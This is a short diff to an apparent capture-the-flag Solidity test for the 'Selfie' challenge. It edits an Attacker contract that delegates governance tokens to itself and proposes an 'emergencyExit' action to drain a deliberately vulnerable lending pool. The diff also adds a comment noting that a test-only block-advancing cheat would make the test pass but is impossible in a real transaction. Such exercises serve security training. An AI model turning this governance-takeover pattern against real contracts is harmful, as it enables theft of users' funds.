@@ -78,7 +78,7 @@ contract SelfieChallenge is Test {
     }
 }
 
-contract Attacker {
+contract Attacker is Test {
 
     SelfiePool private pool;
     SimpleGovernance private governance;
@@ -111,6 +111,11 @@ contract Attacker {
     ) external returns (bytes32) {
 
         token.delegate(address(this));
+
+        // The following would make the test pass, but it is impossible for it
+        // to happen during a transaction.
+
+        // vm.roll(block.number + 1);
 
         // Step 2: Propose an emergency exit action
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
